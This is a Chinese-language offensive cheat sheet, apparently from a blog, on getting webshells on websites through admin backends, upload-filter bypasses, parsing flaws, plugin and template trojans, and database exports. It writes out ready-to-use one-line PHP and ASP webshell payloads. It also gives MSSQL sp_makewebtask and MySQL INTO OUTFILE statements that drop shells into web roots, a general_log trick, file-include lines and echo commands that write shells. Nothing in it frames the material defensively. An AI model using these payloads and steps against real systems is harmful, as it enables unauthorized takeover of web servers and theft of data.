
## 一、管理员权限拿shell

需要有管理员权限才可以拿shell

         通常需要登录后台执行相关操作
    
         直接上传拿shell
    
         国内多对上传类型进行了限制，需要在进行绕过操作
    
        

### 1、[织梦](https://so.csdn.net/so/search?q=%E7%BB%87%E6%A2%A6&spm=1001.2101.3001.7020)cms后台为例子

进入后台

写入一个一句话[木马](https://so.csdn.net/so/search?q=%E6%9C%A8%E9%A9%AC&spm=1001.2101.3001.7020)

长传一个一句话木马

### 2、数据库备份拿shell

示例：南方数据 v7.0 良精通用企业网站管理系统

方法一：

    1.先上一张图马，得到路径
    
    2.选择数据库备份，将图马备份为a.asp
    
    3.访问xxx/xxx/.../a.asp. 不用管新添的后缀名
    
    
        

方法二：

    1、将一句话写入管理员账户名【若输入长度有限制，可以按F12修改】
    
    2、创建该管理员用户。这样就将一句话写入数据库
    
    3、备份数据库为a.asp文件
    
    4、访问。。。
    
        

### 3、突破上传拿shell

         本地js验证上传
    
         服务器mime上传
    
         服务器白名单上传
    
         服务器黑名单上传
    
         服务器filepath上传
    
         双文件上传
    
         %00截断上传
    
         上传其他脚本类型拿shell
    
        

### 4、修改网站上传类型配置拿shell

有的网站在网站上传类型中限制了上传脚本类型文件，可以添加上传文件类型，如php，jsp，asp等拿shell

### 5、利用解析漏洞拿shell

         IIS 5.x/6.0解析漏洞          目录解析，分号解析，畸形文件名解析
    
         IIS 7.0/7.5，Nginx<8.03畸形文件名解析漏洞，php文件解析漏洞
    
         Nginx<8.03空字节代码执行漏洞
    
         Apache解析漏洞
    
        

### 6、利用编辑器漏洞拿shell

    常见的编辑器有fckeditor，ewebeditor，cheditor
    
        

### 7、网站配置插马拿shell

通过找到网站默认配置，将一句话插入到网站配置中，可以事先下载网站源码，查看过滤规则，防止插马失败（"%><%eval request(“abc”)%><%’）根据网站源码进行符号匹配。

### 8、通过编辑模板拿shell

         1、通过对网站的模板进行编辑，写入一句话，然后生成脚本文件拿shell
    
         2、通过将木马添加到压缩文件，把名字改为网站模板类型，上传到网站服务器，拿shell
    
        

### 9、上传插件拿shell

一些网站为了增加某些功能会在后台添加一些插件来实现，我们可以把木马添加到安装的插件中上传服务器拿shell，常见的有博客类网站dz论坛等

         示例：WordPress-V4.2.2
    
         搭建时要先创建数据库
    
         phpstudy——mysql——create database wpp;
    
         插件——已安装的插件——安装插件——下载一个正常的插件，将木马放在里面，一起上传，安装——找上传目录
    
        

### 10、数据库执行拿shell

可通过数据库执行命令导出一句话到网站根目录拿shell，access数据库导出一般需要利用解析漏洞xx.asp;.xml

sqlserve导出：

    ;exec%20sp_makewebtask%20%20%27c:\zhetpub\wwwroot\ms\x1.asp%27,%27select%27%27<%execute(request(“cmd”))%>%27%27%27
    
    
        

mysql命令导出shell

         create TABLE study (cmd text Not NULL);
    
         insert INTO study (cmd) VALUES(‘<?php eval($_POST[cmd])?>’);
    
         select cmd from study into outfile ‘D:/php/www/htdocs/test/seven.php’;
    
         drop TABLE IF EXISTS study;
    
        

或

         use mysql;
    
         create table x (packet text) type=MYISaM;
    
         insert into x (packet) values(‘<pre><body><?php @system($_GET[“cmd”]);?></body></pre>’)
    
         select x into outfile ‘d:\php\xx.php’
    
        

或

         select ‘<?php eval($_POST[cmd]);?>’ into outfile ‘c:/inetpub/wwwroot/mysql.php/1.php’
    
        

**进入phpmyadmin**

1、知道网站路径-
直接执行SQL语句导入shell

注：有时可能出现不允许直接导shell

         解决方法：首页——变量——general lag 编辑——ON——general log file 
         编辑 D:\phpstudy\www\ba.php——SQL——一句话用引号引起来——执行——报错——
         生成日志，利用日志记录生成shell
    
        

2、不知道路径时——推理路径

         首页——变量——mysql的集成环境路径——apache的路径也知道了——D:\phpstudy\Apache\conf\httpd.conf——找个数据库——创建表：
    
        

create table a(a text);

开外链

     load data infile “D:/phpstudy/Apache/conf/httpd.conf” into table  a;
    
        

导出SQL搜索documentroot

路径推理

D:/phpstudy/Apache/conf/httpd.conf 配置文件的路径，找网站根目录

Apache

/usr/local/mysql

/usr/local/apache/conf/httpd.conf

/usr/local/httpd/conf/httpd.conf

/etc/httpd/conf/httpd.conf

/usr/local/apache2/conf/httpd.conf

ngnix

/usr/local/nginx/conf/nginx.conf

phpmyadmin一般在网站根目录下

         当找不到配置文件时，可以读大文件，由于文件太大会报错，有可能会报出phpmyadmin的路径。
    
        

### 11、文件包含拿shell 多用于上传大马

先将webshell改为txt文件上传，然后上传一个脚本文件包含该txt文件，可绕过waf拿shell

asp包含

             1.<!--#include file=”123.jpg”-->
    
             2.调用的文件必须和被调用的文件在同一目录，否则找不到
    
             3.如果找不到，用下面的语句
    
             <--#include virtual=”文件所在目录/123.jpg”-->
    
        

php包含

         <?php include(“123.jpg”)?>
    
        

### 12、命令执行拿shell

         echo ^<^?php @eval($_POST[‘abc’]);?^>^ >c:\1.php
    
         echo ^<^?php @eval($_POST[‘abc’]);?^>^ >c:\1.php
    
         ^<^%eval request(“abc”)%^>^ >c:\1.php
    
        

## 二、普通用户（前台）拿shell

         0day拿shell
    
         IIS写权限拿shell
    
         命令执行拿shell
    
         通过注入漏洞拿shell
    
         前台用户头像上传拿shell
    
         strusts2拿shell
    
         java反序列拿shell
    
        

或者常见CMS拿shell---------直接百度

